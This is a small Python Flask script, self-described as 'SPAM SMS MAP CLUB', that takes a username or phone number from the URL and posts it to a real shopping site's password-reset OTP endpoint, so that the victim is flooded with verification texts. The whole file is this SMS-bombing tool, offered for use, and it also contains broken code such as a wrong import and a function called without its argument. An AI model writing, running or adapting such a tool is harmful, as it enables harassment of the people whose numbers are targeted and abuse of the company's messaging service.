from flask import Flask
import jsonify, requests, json, time

abin={
"Host": "cmsapi.mapclub.com"}
app = Flask(__name__)
@app.route('/<benjamin>', methods=['GET', 'POST'])
def spam(benjamin):
  data={"username": benjamin}
  spamx = requests.post("https://cmsapi.mapclub.com/api/reset-password-otp",headers=abin,json=data).text
  return "SPAM SMS MAP CLUB  CREATOR : BENJAMIN-CODE"

def sms(benjamin):
  spam()
  no = str(benjamin)
  data={"username": benjamin}
  wasap = requests.post("https://cmsapi.mapclub.com/api/reset-password-otp",headers=abin,json=data)
  bin = wasap.text
  return "SPAM SMS MAP CLUB BY BENJAMIN CODE"
if __name__=='__main__':
 app.run(debug=True)

